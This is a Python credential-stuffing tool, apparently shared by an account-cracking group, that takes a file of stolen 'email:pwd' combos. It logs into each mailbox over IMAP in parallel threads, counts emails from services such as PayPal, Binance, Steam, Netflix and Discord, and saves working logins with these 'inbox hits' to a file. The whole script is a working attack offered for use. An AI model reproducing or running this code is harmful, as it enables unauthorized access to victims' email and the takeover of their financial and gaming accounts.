import imaplib
import threading
import time
import sys
import itertools
 # Coded By #anasxzer0
  # Coded By #anasxzer0
   # Coded By #anasxzer0
    # Coded By #anasxzer0
     # Coded By #anasxzer0
      # Coded By #anasxzer0
       # Coded By #anasxzer0
        # Coded By #anasxzer0
         # Coded By #anasxzer0
          # Coded By #anasxzer0
           # Coded By #anasxzer0
            # Coded By #anasxzer0
             # Coded By #anasxzer0
              # Coded By #anasxzer0
               # Coded By #anasxzer0
                # Coded By #anasxzer0
                 # Coded By #anasxzer0
                  # Coded By #anasxzer0
                  
                   # Coded By #anasxzer0 # Coded By #anasxzer0
                    # Coded By #anasxzer0
                     # Coded By #anasxzer0
                      # Coded By #anasxzer0
                      
                      
                       # Coded By #anasxzer0
                       
                        # Coded By #anasxzer0
                        
                        
                         # Coded By #anasxzer0 # Coded By #anasxzer0
                          # Coded By #anasxzer0
                           # Coded By #anasxzer0
                            # Coded By #anasxzer0
                             # Coded By #anasxzer0
                              # Coded By #anasxzer0
                               # Coded By #anasxzer0
                                # Coded By #anasxzer0
                                 # Coded By #anasxzer0
                                  # Coded By #anasxzer0
                                   # Coded By #anasxzer0
                                    # Coded By #anasxzer0
                                     # Coded By #anasxzer0
                                      # Coded By #anasxzer0
                                       # Coded By #anasxzer0
                                        # Coded By #anasxzer0
                                         # Coded By #anasxzer0
                                          # Coded By #anasxzer0
                                           # Coded By #anasxzer0
                                            # Coded By #anasxzer0
                                             # Coded By #anasxzer0
                                              # Coded By #anasxzer0
                                               # Coded By #anasxzer0
                                                # Coded By #anasxzer0
                                                 # Coded By #anasxzer0
                                                  # Coded By #anasxzer0
                                                   # Coded By #anasxzer0
                                                    # Coded By #anasxzer0
                                                     # Coded By #anasxzer0
                                                      # Coded By #anasxzer0
                                                       # Coded By #anasxzer0
                                                       
                                                        # Coded By #anasxzer0 # Coded By #anasxzer0
                                                         # Coded By #anasxzer0
                                                          # Coded By #anasxzer0
                                                           # Coded By #anasxzer0
                                                            # Coded By #anasxzer0
                                                             # Coded By #anasxzer0
                                                             
                                                              # Coded By #anasxzer0 # Coded By #anasxzer0
                                                               # Coded By #anasxzer0
                                                                # Coded By #anasxzer0
                                                                 # Coded By #anasxzer0
                                                                  # Coded By #anasxzer0
                                                                   # Coded By #anasxzer0
                                                                    # Coded By #anasxzer0
                                                                     # Coded By #anasxzer0
                                                                      # Coded By #anasxzer0
                                                                       # Coded By #anasxzer0
                                                                        # Coded By #anasxzer0
                                                                         # Coded By #anasxzer0
                                                                          # Coded By #anasxzer0
                                                                           # Coded By #anasxzer0
                                                                            # Coded By #anasxzer0
                                                                             # Coded By #anasxzer0
                                                                              # Coded By #anasxzer0
                                                                               # Coded By #anasxzer0
                                                                                # Coded By #anasxzer0
                                                                                 # Coded By #anasxzer0
                                                                                  # Coded By #anasxzer0
                                                                                   # Coded By #anasxzer0
                                                                                    # Coded By #anasxzer0
                                                                                    
                                                                                     # Coded By #anasxzer0
                                                                                      # Coded By #anasxzer0 # Coded By #anasxzer0 # Coded By #anasxzer0
                                                                                       # Coded By #anasxzer0
                                                                                        # Coded By #anasxzer0
                                                                                         # Coded By #anasxzer0
                                                                                          # Coded By #anasxzer0
                                                                                           # Coded By #anasxzer0
                                                                                            # Coded By #anasxzer0
                                                                                            

YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
RESET = "\033[0m"

def animate_checking():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write(f'\r{YELLOW}[/] Checking {c}{RESET}')
        sys.stdout.flush()
        time.sleep(0.1)

def login_imap(server, email_user, email_pass):
    try:
        mail = imaplib.IMAP4_SSL(server)
        mail.login(email_user, email_pass)
        return mail
    except Exception:
        
        return None

def search_emails(mail, search_criteria):
    try:
        mail.select("inbox")
        result, data = mail.search(None, search_criteria)
        if result != "OK":
            return []
        return data[0].split()
    except Exception:
        return []

def process_account(server, email_pass_combo, output_file, lock):
    email_user, email_pass = email_pass_combo.split(":")
    
    
    if "t-online.de" in email_user:
        server = "imap.t-online.de"  

    mail = login_imap(server, email_user, email_pass)
    if not mail:
        return

    search_criteria_list = [
        ('TikTok', 'FROM "register@account.tiktok.com"'),
        ('Steam', 'FROM "noreply@steampowered.com"'),
        ('Epic Games', 'FROM "help@accts.epicgames.com"'),
        ('Rockstar', 'FROM "noreply@rockstargames.com"'),
        ('Netflix', 'FROM "info@members.netflix.com"'),
        ('Spotify', 'FROM "no_reply@spotify.com"'),
        ('PayPal', 'FROM "noreply@mail.paypal.com"'),
        ('Pubg', 'FROM "noreply@pubgmobile.com"'),
        ('COD', 'FROM "noreply@updates.activision.com"'),
        ('Play Station', 'FROM "reply@txn-email.playstation.com"'),
        ('XBOX', 'FROM "xboxreps@engage.xbox.com"'),
        ('Konami', 'FROM "konami-info@konami.net"'),
        ('Binance', 'FROM "do_not_reply@mailersp2.binance.com"'),
        ('OnlyFans', 'FROM "no-reply@onlyfans.com"'),
        ('Crunchyroll', 'FROM "hello@info.crunchyroll.com"'),
        ('NordVPN', 'FROM "support@nordaccount.com"'),
        ('Roblox', 'FROM "accounts@roblox.com"'),
        ('Supercell', 'FROM "noreply@id.supercell.com"'),
        ('Facebook', 'FROM "notification@priority.facebookmail.com"'),
        ('Instagram', 'FROM "no-reply@mail.instagram.com"'),
        ('BingX', 'FROM "noreply@promo.bingx.com"'),
        ('BestBuy', 'FROM "newsletter@e.bestbuy.ca"'),
        ('CashApp', 'FROM "cash@square.com"'),
        ('ExpressVPN', 'FROM "support@expressvpn.com"'),
        ('Shopify', 'FROM "email@email.shopify.com"'),
        ('Adobe', 'FROM "message@adobe.com"'),
        ('PicsArt', 'FROM "no-reply@picsart.com"'),
        ('Joom', 'FROM "no-reply@notifications.joom.com"'),
        ('Discord', 'FROM "noreply@discord.com"'),
        ('Twitter', 'FROM "verify@x.com"'),
        ('Lego', 'FROM "account@mail.identity.lego.com"'),
        ('DisneyPlus', 'FROM "disneyplus@mail2.disneyplus.com"'),
        ('Wish', 'FROM "notification@wish.com"')
    ]
    
    results = []
    
    for app_name, search_criteria in search_criteria_list:
        count = len(search_emails(mail, search_criteria))
        if count > 0:
            results.append(f"{app_name} = {count}")
        else:
            results.append(f"{app_name} = 0")

    if results:
        output_line = f"{email_user}:{email_pass} ➔ " + " | ".join(results) + "\n"
        with lock:
            with open(output_file, "a") as f:
                f.write(output_line)
    
    mail.logout()

def main():
    global done
    done = False
    
    combo_file = input("Enter the combo file (email:pwd): ")  # Coded By #anasxzer0  # Coded By #anasxzer0
    output_file = "Inbox hits @FlixAccounts .txt"

    with open(combo_file, "r") as f:
        combos = f.read().splitlines()

    lock = threading.Lock()
    threads = []
    
    
    animation_thread = threading.Thread(target=animate_checking)
    animation_thread.start()
    
    for combo in combos:
        if any(domain in combo for domain in ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr", "t-online.de", "onet.pl", "gmail.com", "orange.fr"]):
            thread = threading.Thread(target=process_account, args=("imap-mail.outlook.com", combo, output_file, lock))
            threads.append(thread)
            thread.start()
            
            time.sleep(0.05)  

            
            if len(threads) >= 70:
                for t in threads:
                    t.join()
                threads = []

    for t in threads:
        t.join()

    
    done = True
    animation_thread.join()

    print(f"\r{GREEN}[✔] Complete{RESET}\n @anasxzer0 ^ @FlixAccounts ")

if __name__ == "__main__":
    main()